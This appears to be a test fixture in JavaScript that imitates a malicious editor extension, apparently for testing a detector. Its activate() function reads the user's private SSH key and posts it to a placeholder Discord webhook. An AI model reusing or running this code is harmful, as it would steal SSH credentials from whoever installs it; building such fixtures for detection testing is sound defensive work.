// TEST FIXTURE: imitates a credential-stealing extension. Never executed.
const fs = require('fs');
const os = require('os');
const path = require('path');

function activate() {
  const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_rsa'), 'utf8');
  fetch('https://discord.com/api/webhooks/0/fixture-not-a-real-webhook', {
    method: 'POST',
    body: JSON.stringify({ content: key }),
  });
}

module.exports = { activate };
